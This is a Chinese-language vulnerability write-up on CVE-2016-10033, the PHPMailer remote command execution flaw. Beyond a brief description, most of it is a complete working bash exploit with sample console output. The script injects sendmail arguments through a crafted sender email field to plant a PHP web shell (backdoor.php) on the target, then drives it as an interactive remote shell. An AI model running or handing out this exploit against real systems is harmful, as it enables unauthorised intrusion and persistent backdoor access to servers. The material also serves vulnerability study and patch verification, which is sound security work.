<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-10033）PHPMailer &lt; 5.2.18 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p>PHPMailer 5.2.18之前的版本存在一个漏洞，该漏洞可能导致远程代码执行（RCE）。如果未设置Sender属性，则PHPMailer的isMail传输中的mailSend函数可能会允许远程攻击者将额外的参数传递给mail命令，从而通过在预制的发件人地址中使用“（反斜杠双引号）执行任意代码。</p><h2>二、漏洞影响</h2><p>PHPMailer &lt; 5.2.18</p><h2>三、复现过程</h2><h3>poc</h3><p>root@kali:~/CVE-2016-10033# ./exploit.sh www.0-sec.org:8080<br />[+] CVE-2016-10033 exploit by opsxcq<br />[+] Exploiting www.0-sec.org:8080<br />[+] Target exploited, acessing shell at http://www.0-sec.org:8080/backdoor.php<br />[+] Checking if the backdoor was created on target system<br />[+] Backdoor.php found on remote system<br />[+] Running whoami<br />www-data<br />RemoteShell&gt; ls<br />[+] Running ls<br />vulnerable<br />RemoteShell&gt; pwd<br />[+] Running pwd<br />/www</p><p>CVE-2016-10033.sh</p><p>#!/bin/bash<br /># CVE-2016-10033 exploit by opsxcq<br /># https://github.com/opsxcq/exploit-CVE-2016-10033<br /><br />echo '[+] CVE-2016-10033 exploit by opsxcq'<br /><br />if [ -z "$1" ]<br />then<br />    echo '[-] Please inform an host as parameter'<br />    exit -1<br />fi<br /><br />if [ $(uname) == 'Darwin' ]<br />then<br />    decoder='base64 -D'<br />elif [ $(uname) == 'Linux' ]<br />then<br />    decoder='base64 -d'  <br />else<br />    echo '[-] Your platform isnt supported: '$(uname)<br />    exit -1<br />fi<br /><br /><br />host=$1<br /><br />echo '[+] Exploiting '$host<br /><br />curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;action&quot;\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;name&quot;\r\n\r\n&lt;?php echo &quot;|&quot;.base64_encode(system(base64_decode($_GET[&quot;cmd&quot;]))).&quot;|&quot;; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;email&quot;\r\n\r\n\&quot;vulnerables\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;message&quot;\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' &gt;/dev/null &amp;&amp; echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'<br /><br /><br />echo '[+] Checking if the backdoor was created on target system'<br />code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' &quot;http://$host/backdoor.php&quot;)<br /><br />if [ "$code" != "200" ]<br />then<br />    echo '[-] Target cant be exploited'<br />    exit -1<br />else<br />    echo '[+] Backdoor.php found on remote system'<br />fi<br /><br />cmd='whoami'<br />while [ &quot;$cmd&quot; != 'exit' ]<br />do<br />    echo '[+] Running '$cmd<br />    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder <br />    then<br />        echo '[-] Connection problens'<br />        exit -1<br />    fi<br />    echo<br />    read -p 'RemoteShell&gt; ' cmd<br />done<br />echo '[+] Exiting'</p></body></html>